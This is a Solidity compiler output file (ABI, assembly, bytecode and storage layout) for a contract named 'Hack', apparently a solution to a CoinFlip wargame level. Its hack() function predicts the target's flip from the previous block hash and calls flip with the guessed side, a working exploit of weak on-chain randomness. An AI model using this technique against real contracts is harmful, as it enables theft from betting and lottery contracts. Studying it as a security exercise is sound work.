{
	"CoinFlip.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "side",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"CoinFlip.sol\":137:663  contract Hack{... */\n  mstore(0x40, 0x80)\n    /* \"CoinFlip.sol\":236:313  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"CoinFlip.sol\":219:313  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"CoinFlip.sol\":342:419  constructor(address _addr) public{... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"CoinFlip.sol\":406:411  _addr */\n  dup1\n    /* \"CoinFlip.sol\":385:394  coin_flip */\n  0x00\n  dup1\n    /* \"CoinFlip.sol\":385:412  coin_flip = CoinFlip(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"CoinFlip.sol\":342:419  constructor(address _addr) public{... */\n  pop\n    /* \"CoinFlip.sol\":137:663  contract Hack{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip.sol\":137:663  contract Hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8475c028\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"CoinFlip.sol\":319:335  bool public side */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n    tag_6:\n        /* \"CoinFlip.sol\":457:475  uint256 blockValue */\n      0x00\n        /* \"CoinFlip.sol\":510:511  1 */\n      0x01\n        /* \"CoinFlip.sol\":496:508  block.number */\n      number\n        /* \"CoinFlip.sol\":496:511  block.number -1 */\n      sub\n        /* \"CoinFlip.sol\":486:512  blockhash(block.number -1) */\n      blockhash\n        /* \"CoinFlip.sol\":478:513  uint256(blockhash(block.number -1)) */\n      0x00\n      shr\n        /* \"CoinFlip.sol\":457:513  uint256 blockValue = uint256(blockhash(block.number -1)) */\n      swap1\n      pop\n        /* \"CoinFlip.sol\":523:539  uint256 coinFlip */\n      0x00\n        /* \"CoinFlip.sol\":571:577  FACTOR */\n      sload(0x01)\n        /* \"CoinFlip.sol\":558:568  blockValue */\n      dup3\n        /* \"CoinFlip.sol\":550:577  uint256(blockValue)/ FACTOR */\n      dup2\n      tag_10\n      jumpi\n      invalid\n    tag_10:\n      div\n        /* \"CoinFlip.sol\":523:578  uint256 coinFlip = uint256(uint256(blockValue)/ FACTOR) */\n      swap1\n      pop\n        /* \"CoinFlip.sol\":607:608  1 */\n      0x01\n        /* \"CoinFlip.sol\":595:603  coinFlip */\n      dup2\n        /* \"CoinFlip.sol\":595:608  coinFlip == 1 */\n      eq\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n      tag_11\n      jumpi\n        /* \"CoinFlip.sol\":618:623  false */\n      0x00\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n      jump(tag_12)\n    tag_11:\n        /* \"CoinFlip.sol\":611:615  true */\n      0x01\n        /* \"CoinFlip.sol\":595:623  coinFlip == 1 ? true : false */\n    tag_12:\n        /* \"CoinFlip.sol\":588:592  side */\n      0x02\n      0x00\n        /* \"CoinFlip.sol\":588:623  side = coinFlip == 1 ? true : false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip.sol\":633:642  coin_flip */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"CoinFlip.sol\":633:647  coin_flip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CoinFlip.sol\":648:652  side */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"CoinFlip.sol\":633:653  coin_flip.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"CoinFlip.sol\":425:660  function hack() public{... */\n      pop\n      pop\n      jump\t// out\n        /* \"CoinFlip.sol\":319:335  bool public side */\n    tag_8:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506040516102713803806102718339818101604052602081101561005757600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101b9806100b86000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80634de260a21461003b5780638475c02814610045575b600080fd5b610043610065565b005b61004d610170565b60405180821515815260200191505060405180910390f35b6000600143034060001c90506000600154828161007e57fe5b04905060018114610090576000610093565b60015b600260006101000a81548160ff02191690831515021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67600260009054906101000a900460ff166040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561013057600080fd5b505af1158015610144573d6000803e3d6000fd5b505050506040513d602081101561015a57600080fd5b8101908080519060200190929190505050505050565b600260009054906101000a900460ff168156fea26469706673582212205c7fb7473ea06eeeedfa76cfbba109d63d51ce78a2b312bd7e7fa33dfbe80a6464736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x271 CODESIZE SUB DUP1 PUSH2 0x271 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x1B9 DUP1 PUSH2 0xB8 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8475C028 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x65 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x170 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER SUB BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 DUP2 PUSH2 0x7E JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x1 DUP2 EQ PUSH2 0x90 JUMPI PUSH1 0x0 PUSH2 0x93 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x130 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x144 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5C PUSH32 0xB7473EA06EEEEDFA76CFBBA109D63D51CE78A2B312BD7E7FA33DFBE80A646473 PUSH16 0x6C634300060C00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "88200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"hack()": "infinite",
						"side()": "1047"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2",
					"side()": "8475c028"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 11,
						"contract": "CoinFlip.sol:Hack",
						"label": "coin_flip",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(CoinFlip)9"
					},
					{
						"astId": 14,
						"contract": "CoinFlip.sol:Hack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 16,
						"contract": "CoinFlip.sol:Hack",
						"label": "side",
						"offset": 0,
						"slot": "2",
						"type": "t_bool"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(CoinFlip)9": {
						"encoding": "inplace",
						"label": "contract CoinFlip",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}